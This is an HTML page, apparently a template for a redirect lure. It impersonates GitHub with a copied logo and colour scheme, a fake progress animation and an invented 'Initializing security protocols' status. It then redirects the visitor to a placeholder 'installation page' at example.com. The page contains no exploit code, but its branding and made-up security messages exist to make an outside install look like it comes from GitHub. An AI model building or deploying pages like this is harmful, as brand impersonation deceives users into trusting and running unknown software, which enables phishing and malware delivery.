<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub - Redirect</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: #0d1117;
    color: #f0f6fc;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }

  .wrapper {
    width: 100%;
    max-width: 500px;
    text-align: center;
  }

  .github-logo {
    font-size: 32px;
    font-weight: 700;
    color: #f0f6fc;
    margin-bottom: 12px;
  }

  .subtitle {
    color: #8b949e;
    font-size: 18px;
    font-weight: 400;
    margin-bottom: 40px;
  }

  .card {
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 16px;
    padding: 32px;
    margin-bottom: 32px;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
  }

  .progress-header {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin-bottom: 16px;
    font-size: 14px;
    color: #c9d1d9;
  }

  .progress-percent {
    font-weight: 600;
    color: #2ea043;
    font-size: 16px;
  }

  .progress-bar {
    height: 6px;
    background: #21262d;
    border-radius: 3px;
    overflow: hidden;
    margin-bottom: 28px;
  }

  .progress-fill {
    height: 100%;
    width: 10%;
    background: linear-gradient(90deg, #2da44e, #2da44e);
    border-radius: 3px;
    animation: progressAnimation 2s ease-in-out forwards;
  }

  @keyframes progressAnimation {
    0% { width: 10%; }
    100% { width: 100%; }
  }

  .status {
    display: flex;
    align-items: center;
    gap: 10px;
    margin-bottom: 24px;
    font-size: 15px;
    color: #f0f6fc;
  }

  .status-dot {
    width: 8px;
    height: 8px;
    background: #2ea043;
    border-radius: 50%;
    animation: pulse 1.5s infinite ease-in-out;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.4; }
  }

  .branch-badge {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: rgba(35, 134, 54, 0.15);
    border: 1px solid rgba(35, 134, 54, 0.3);
    color: #2ea043;
    padding: 10px 16px;
    border-radius: 8px;
    font-size: 14px;
    font-weight: 500;
    margin-bottom: 32px;
  }

  .branch-arrow {
    font-size: 12px;
    opacity: 0.8;
  }

  /* Уменьшенные квадратики */
  .grid-container {
    display: grid;
    grid-template-columns: repeat(10, 1fr);
    gap: 6px;
    margin-bottom: 8px;
  }

  .grid-cell {
    width: 12px;
    height: 12px;
    background: #21262d;
    border-radius: 2px;
    transition: all 0.3s ease;
    margin: 0 auto;
  }

  .grid-cell.active {
    background: linear-gradient(135deg, #238636, #2ea043);
    box-shadow: 0 0 6px rgba(46, 160, 67, 0.4);
    transform: scale(1.2);
  }

  .footer {
    color: #8b949e;
    font-size: 15px;
    padding-top: 20px;
    border-top: 1px solid #30363d;
    margin-top: 24px;
  }
</style>
</head>
<body>

<div class="wrapper">
  <div class="github-logo">GitHub</div>
  <p class="subtitle">Preparing to redirect to external application</p>

  <div class="card">
    <div class="progress-header">
      <span>Processing request</span>
      <span class="progress-percent" id="percent">10%</span>
    </div>

    <div class="progress-bar">
      <div class="progress-fill" id="bar"></div>
    </div>

    <div class="status">
      <div class="status-dot"></div>
      <span>Initializing security protocols</span>
    </div>

    <div class="branch-badge">
      <span>main</span>
      <span class="branch-arrow">→</span>
      <span>external-app</span>
    </div>

    <div class="grid-container" id="grid"></div>

    <p class="footer">You will be redirected to the installation page shortly</p>
  </div>
</div>

<script>
  // Инициализация сетки (70 квадратиков)
  const grid = document.getElementById('grid');
  
  for (let i = 0; i < 70; i++) {
    const cell = document.createElement('div');
    cell.className = 'grid-cell';
    grid.appendChild(cell);
  }
  
  // Анимация квадратиков (случайное включение)
  setInterval(() => {
    const cells = document.querySelectorAll('.grid-cell');
    cells.forEach(cell => {
      if (Math.random() > 0.9) { // 10% шанс активации
        cell.classList.add('active');
        setTimeout(() => {
          cell.classList.remove('active');
        }, 300);
      }
    });
  }, 200);
  
  // Обновление процента прогресса в соответствии с анимацией полосы
  const percentElement = document.getElementById('percent');
  let currentPercent = 10;
  
  // Функция для обновления процента
  function updateProgress() {
    const bar = document.getElementById('bar');
    const computedStyle = getComputedStyle(bar);
    const width = computedStyle.width;
    const widthPercent = parseFloat(width) / parseFloat(getComputedStyle(bar.parentElement).width) * 100;
    
    currentPercent = Math.min(100, Math.floor(widthPercent));
    percentElement.textContent = currentPercent + '%';
    
    if (currentPercent < 100) {
      requestAnimationFrame(updateProgress);
    } else {
      // Редирект после завершения
      setTimeout(() => {
        window.location.href = 'https://example.com/installation';
      }, 500);
    }
  }
  
  // Запуск обновления процента
  setTimeout(() => {
    updateProgress();
  }, 100);
</script>

</body>
</html>
